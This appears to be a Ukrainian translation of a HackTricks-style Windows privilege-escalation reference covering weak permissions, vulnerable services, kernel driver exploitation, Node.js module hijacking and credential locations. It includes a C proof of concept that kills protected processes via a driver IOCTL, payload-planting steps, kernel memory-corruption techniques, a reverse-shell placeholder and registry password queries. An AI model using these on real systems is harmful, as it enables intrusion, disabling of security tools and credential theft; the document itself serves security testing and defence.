У NTFS доступний для читання файл може мати іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликого релевантного набору доступних резервних копій або файлів конфігурації перегляньте **назви й розміри** потоків, перш ніж відкривати їхній вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на наявність секрету, — лише зачіпка. Перевірте ефективний доступ до читання файлу, підтримку потоків файловою системою, чи містить потік придатні до використання облікові дані та до якого облікового запису вони справді дають змогу автентифікуватися. Під час звичайного переліку не виконуйте рекурсивне сканування потоків і не виводьте їхній вміст.

## Вхідні файли допоміжного засобу Windows Driver Kit у запланованому завданні

Необов’язковий Windows Driver Kit містить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` із каталогу запуску. Заплановане завдання або служба, що запускає цей допоміжний засіб із привілейованим обліковим записом, може перетворити доступ на запис до цих вхідних файлів із низькими привілеями на виконання команд у контексті цього облікового запису, навіть якщо сам виконуваний файл захищений. Переконайтеся, що привілейований процес використовує ці файли, і що **обидва** допоміжні файли можна створити або змінити; самого факту наявності допоміжного засобу недостатньо.

Для запланованого завдання перевірте [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) його дії та ACL обох шляхів до допоміжних файлів. Якщо для завдання не вказано робочий каталог, каталог виконуваного файлу — лише зачіпка, яку потрібно перевірити, а не доказ того, звідки завдання читає вхідні файли. Також має виконуватися вимога щодо файлу проєкту. Перевірте фактичний principal завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Програми

### Установлені програми

Перевірте **дозволи для бінарних файлів** (можливо, один із них можна перезаписати й підвищити привілеї) та **каталогів** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях виправлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім виконували наявний файл із захистом від запису, якщо заміна не вдавалася. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень установленого виправлення та можливість виконання відповідної операції агента; позначка лише гілки, наприклад `2.1`, не дає змоги визначити наявність вразливості. Під час перерахування можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби ADSelfService Plus SAML

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася збірки ADSelfService Plus 6210 і попередніх; постачальник виправив її у збірці 6211. Вона актуальна лише якщо SAML SSO **увімкнено або було ввімкнено**. Тому запис про встановлений продукт або шлях до служби — це зачіпка, а не підтвердження вразливості: перевірте точну збірку, історію конфігурації SAML, доступність служби з мережі та обліковий запис, від імені якого вона працює. Виконання коду через службу успадковує привілеї цього облікового запису; для виконання від імені SYSTEM потрібен екземпляр, запущений від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема зашифрована резервна копія-зачіпка, а не доказ наявності придатних до використання облікових даних чи цієї SAML-вразливості. Під час звичайного перерахування зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі контролю Jenkins controller та доменних облікових записів

На контролері Jenkins під Windows розрізняйте дозвіл створювати або налаштовувати завдання та дозвіл запускати його: [Jenkins описує їх як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер може бути ще одним способом запуску збірки, але перевірте, що він увімкнений і збірка справді запускається. Виконання відбувається від імені контролера або вибраного агента, а збережені облікові дані можна використовувати лише якщо завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає дані облікових записів і ключі шифрування у `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([сховище секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сама їхня наявність не розкриває пароль; перевірте **доступ на читання потрібних файлів** і наявність окремого шляху повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право запису в `scriptPath` об’єкта AD user, перевірте, що шлях доступний для запису, а також наявність реального входу в систему або запланованого споживача, який працює від імені цільового користувача, перш ніж вважати це виконанням коду від імені іншого користувача. Будь-який додатковий контроль групи потребує окремої перевірки ефективних прав AD.

#### Ідентифікація self-hosted agent в Azure Pipelines

Для проєкту Azure DevOps Server або Azure Pipelines розрізняйте дозвіл **створювати або редагувати** pipeline, дозвіл **ставити його в чергу** та дозвіл використовувати вибраний пул агентів; [Microsoft окремо описує дозволи pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок зі скриптом і запустити pipeline на self-hosted агенті Windows, цей крок виконується від імені [налаштованого облікового запису операційної системи агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж заявляти про перехід між користувачами чи до SYSTEM, перевірте конкретний pipeline, обмеження гілок/ресурсів, авторизований пул, завдання, яке можна запустити, та ідентифікатор служби агента. Сам факт наявності агента, ролі в проєкті чи прав на запис у репозиторій — лише зачіпка; під час пасивного перерахування перевірте дозволи та локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та здійснюється доступ до її бази даних SQL, і **обліковий запис конектора AD DS**, дозволи якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані конектора зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено за допомогою DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Наявність встановленої служби синхронізації, групи з назвою, що натякає на права локального адміністратора, або самого лише доступу до бази даних не підтверджує можливість розшифрувати облікові дані чи підвищити привілеї в домені. Окремо перевірте фактичні права читання бази даних, доступ облікового запису служби до ключів, структуру інсталяції та SQL, налаштовану ідентичність конектора й ефективні права цієї ідентичності в AD. Під час звичайного перерахування виводьте лише метадані служби та доступу, не запитуйте й не друкуйте збережені секрети.

#### Дозволи на DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованішому процесі друку. Перевірте ACL точного каталогу драйвера та DLL, включно з батьківськими каталогами й точками повторного аналізу, навіть якщо перерахування принтерів через WMI заборонене. Для [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [в оригінальному описі](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) йдеться про завантаження DLL процесом `PrintIsolationHost.exe`. ACL із правом запису — лише зачіпка: перевірте ефективний доступ на запис після врахування заборонних записів, наявність відповідного драйвера та завантаження ним файлу від імені привілейованої ідентичності, а також те, чи виправив інсталяцію оновлений драйвер або засіб безпеки постачальника. Не робіть висновок про вразливість лише за назвою каталогу чи версією драйвера.

### Дозволи на запис

Перевірте, чи можете змінити файл конфігурації, щоб прочитати певний спеціальний файл, або змінити виконуваний файл, який має запускатися з облікового запису адміністратора (schedtasks).

Знайти каталоги/файли зі слабкими дозволами в системі можна так:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++ для закріплення/виконання

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо доступна портативна або скопійована інсталяція з правом запису, розміщення шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і зворотних викликів плагіна).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту

**Перевірте, чи можете ви перезаписати запис реєстру або бінарний файл, який запускатиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **розташування autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Шукайте потенційно **підозрілі/вразливі драйвери сторонніх виробників**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в kernel memory (поширене явище в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши SYSTEM token із kernel memory.<sup>[[13]](#references)</sup> Покрокову техніку дивіться тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Пов’язані матеріали з експлуатації Windows kernel:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Для race-condition багів, у яких вразливий виклик відкриває контрольований атакувальником шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF у cancel-safe queue, витоки з paged-pool і переходи через I/O ring

Деякі ланцюжки Windows kernel LPE можна побудувати на основі двох окремо слабких багів: **race condition у життєвому циклі cancel-safe queue**, що звільняє запит/CBD, поки блокування черги ще утримується, та витоку **lock-release-before-copy**, який розкриває звільнену алокацію paged-pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки з аудиту та експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання з послідовністю **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування має послідовність **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до зняття блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може згодом продовжити роботу та передати звільнений `PFLT_CALLBACK_DATA` назад у callback-драйвера для видалення.
- **Повторно використайте звільнений об’єкт черги**, виділивши paged-pool тієї самої довжини, контрольований атакувальником. Елементи черги даних `NPFS` корисні, оскільки їхній вміст і розмір можна контролювати, а згодом перевіряти за допомогою операцій читання/peek pipe. Якщо звільнений об’єкт містить посилання на список, перезапишіть їх **циклічним списком фальшивих вузлів запиту в user memory**, щоб драйвер неодноразово обробляв визначені атакувальником структури запитів, а не завершував обхід на початковій голові списку.
- **Розширте можливості передбачуваного запису**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, який використовується для записів обліку (мітки часу / QPC / поля поруч із refcount), можна отримати kernel write з **контрольованою адресою, але неконтрольованим значенням**. У такому разі націльтеся на поле **length/size** об’єкта зі sprayed pool, а не на кінцевий вказівник на код/дані, а потім переберіть sprayed-об’єкти, доки пошкоджений об’єкт не дасть змогу виконати **out-of-bounds читання paged-pool**.
- **Шаблон витоку, вразливий до race condition**: будь-який syscall із послідовністю `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` — перспективна ціль. Надійність зростає, якщо атакувальник може збільшити буфер для копіювання (наприклад, додавши багато елементів списку/ресурсів, які збільшують кінцевий розмір алокації серіалізатора), оскільки довше копіювання розширює вікно заміни без обов’язкового аварійного завершення системи.
- **Цілі для повторного заповнення, що містять багато вказівників**: масиви зареєстрованих буферів Windows **I/O ring** — чудові цілі для витоку, оскільки їхній розмір у paged-pool контролюється атакувальником (`8 * regBufferCnt`), а кожен елемент є вказівником ядра на `_IOP_MC_BUFFER_ENTRY`. Витечіть один із цих масивів, відновіть розташований поруч `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником елементи й надавали довільне читання/запис у kernel memory. Якщо єдиний доступний запис дає стабільний байт (наприклад, із `KUSER_SHARED_DATA+0x14`), використайте **перекривні невирівняні записи**, щоб сформувати повторюваний байт у вказівнику користувача, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні індикатори для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно отримаєте довільне читання/запис у ядрі через пошкоджений I/O ring, викрадіть токен SYSTEM стандартним workflow після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті куща реєстру

Уразливості сучасних кущів реєстру дають змогу формувати детерміновані макети пам’яті, зловживати записуваними дочірніми ключами HKLM/HKU та перетворювати пошкодження метаданих на переповнення paged pool ядра без власного драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у режимі direct `RtlQueryRegistryValues` через контрольовані атакувальником шляхи

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише, чи є він коректним рядком UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` із `RTL_QUERY_REGISTRY_DIRECT` для запису в скаляр на стеку, наприклад `int readValue`. Якщо прапорець `RTL_QUERY_REGISTRY_TYPECHECK` відсутній, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не до типу, якого очікував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Плутанина повноважень / оракул**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу запитувати вибрані атакувальником ключі, розкривати їхню наявність через коди повернення/журнали й іноді читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: адреса призначення скаляра, наприклад `&readValue`, може інтерпретуватися хибно як `REG_QWORD`, `UNICODE_STRING` або буфер із заданим розміром залежно від типу значення реєстру.

Практичні примітки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **ненадійного куща** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **ключі, доступні для запису, у довірених системних кущах**, а не розміщуйте значення в `HKCU`.
- **Розміщення даних у довіреному кущі**: скористайтеся NtObjectManager, щоб знайти доступні для запису дочірні ключі в `\Registry\Machine`, а потім повторіть пошук із дубльованим токеном **низького рівня цілісності**, щоб виявити ключі, доступні ізольованим контекстам:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує сусідні дані стека й може частково перезаписати сусідній вказівник на callback/функцію.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у direct mode очікується, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скалярну змінну на стеку, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає напівконтрольований запис у kernel.
- **`REG_BINARY`**: для великих бінарних даних у direct mode перший `LONG` за адресою `EntryContext` трактується як знаковий розмір буфера. Якщо попереднє читання `REG_DWORD` залишає в повторно використаній скалярній змінній контрольоване атакувальником **від’ємне** значення, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо в сусідні слоти стека. Часто це найпростіший шлях до повного перезапису вказівника callback.

Надійна закономірність для пошуку: **читання різних типів значень реєстру в ту саму змінну стека без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використані вказівники `EntryContext` і шляхи виконання, де перше читання з реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN у device objects (LPE + знищення EDR)

Деякі підписані драйвери сторонніх розробників створюють свій device object із надійним SDDL через IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом, що дає змогу будь-якому непривілейованому користувачеві отримати handle, використовуючи такий шлях у namespace:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в роботу системи. Приклади можливостей, виявлених на практиці:
- Повертати handles із повним доступом до довільних процесів (викрадення токена / запуск оболонки SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис необроблених даних диска (втручання в систему поза мережею, прийоми забезпечення persistence під час завантаження).
- Завершувати довільні процеси, зокрема Protected Process/Light (PP/PPL), даючи змогу знищити AV/EDR із user mode через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigigation для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися за допомогою DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте посередницькі моделі замість прямих привілеїв ядра.

Ідеї для виявлення для захисників
- Відстежуйте відкриття з user-mode підозрілих імен пристроїв (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що можуть свідчити про зловживання.
- Застосовуйте список заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і ведіть власні списки дозволених і заборонених елементів.


## PATH DLL Hijacking

Якщо у вас є **права на запис у папку, яка міститься в PATH**, ви можете перехопити DLL, завантажувану процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Для отримання додаткової інформації про те, як скористатися цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **Windows uncontrolled search path**, який впливає на програми **Node.js** та **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows пошук може дійти до кореня диска, тому програма, запущена з `C:\Users\Administrator\project\app.js`, може перевіряти такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, доки **процес Node/Electron із вищими привілеями** спробує знайти відсутню залежність. Payload виконається в контексті безпеки процесу-жертви, тож це перетворюється на **LPE**, якщо ціль запускається від імені адміністратора, у межах підвищеного завдання планувальника або оболонки служби чи як привілейована програма робочого столу з автозапуском.

Це особливо поширено, коли:

- залежність указана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу в разі помилки
- пакет видалили з production-збірок, не включили під час пакування або не вдалося встановити
- вразливий `require()` міститься глибоко в дереві залежностей, а не в коді основної програми

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях пошуку:<sup>[[23]](#references)</sup>

- Фільтр `Process Name` = цільовий виконуваний файл (`node.exe`, EXE-файл програми Electron або процес-оболонка)
- Фільтр `Path` `contains` `node_modules`
- Зосередьтеся на `NAME NOT FOUND` і останньому успішному відкритті в `C:\node_modules`

Корисні шаблони для аналізу коду в розпакованих файлах `.asar` або вихідному коді програми:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневу директорію пошуку, якщо її ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть програму-жертву. Якщо програма спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, що відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але повторно використовувати можна саме **техніку**: знайдіть будь-який **bare import**, який привілейований процес Windows на Node/Electron намагатиметься знайти.

### Ідеї для виявлення та посилення захисту

- Сповіщайте про створення користувачем `C:\node_modules` або запису туди нових `.js`-файлів чи пакетів.
- Шукайте процеси з високим рівнем цілісності, які читають файли з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до продакшн-збірки та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів на кшталт `try { require("...") } catch {}`, які не повідомляють про помилки.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких розгортаннях `ws` можна уникнути застарілої перевірки `utf-8-validate`, задавши `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### Файл hosts

Перевірте, чи не вказані в файлі hosts адреси інших відомих комп’ютерів.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте ззовні, чи доступні **служби з обмеженим доступом**.

```bash
netstat -ano #Opened ports?
```

Для локального прослуховувача зіставте його PID із власником процесу, шляхом до виконуваного файлу та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ від імені свого користувача робочого стола лише за умови, що це дозволяють її автентифікація та засоби керування командами. Користувацький TCP-застосунок, що працює з вищими привілеями, потребує окремого аналізу: прослуховувач і шлях до бінарного файлу — це лише пасивні зачіпки, тоді як шлях до автентифікованої експлуатації пошкодження пам’яті вимагає аналізу саме цього бінарного файлу та доступного йому вводу. Якщо здається, що відкритий порт належить системному процесу, перш ніж визначати службу на кінцевому вузлі, порівняйте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме правило переадресації не доводить, що ціль доступна або вразлива.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку зі списком команд для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше[ команд для переліку мережі тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, то зможете слухати на будь-якому порту (під час першого використання `nc.exe` для прослуховування порту у графічному інтерфейсі з’явиться запит, чи слід дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Сам по собі Linux `root` у WSL не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows може читати файлову систему дистрибутива, перевірте файли історії команд оболонки, зокрема `/root/.bash_history`, на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` характерна для старих інсталяцій WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тож спершу визначте фактичний дистрибутив і шлях до його сховища. Не виводьте вміст історії команд під час автоматизованого перебирання.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Вважайте `DefaultUserName` і `DefaultDomainName` контекстом облікового запису, а не обліковими даними. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` є знахідкою у реєстрі з паролем у відкритому тексті. Якщо `AutoAdminLogon=1`, але пароль у відкритому тексті не читається, це лише зачіпка: [Sysinternals Autologon can store the password as an LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про витік облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Менеджер облікових даних / Windows Vault

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, які **Windows** може використовувати для **автоматичного входу користувачів**. Спершу може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і налаштувати автоматичний вхід у браузерах, але це працює не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично виконувати вхід користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може скористатися цим Credential Manager** і Windows Vault та використовувати надані облікові дані замість того, щоб щоразу вводити ім’я користувача й пароль.

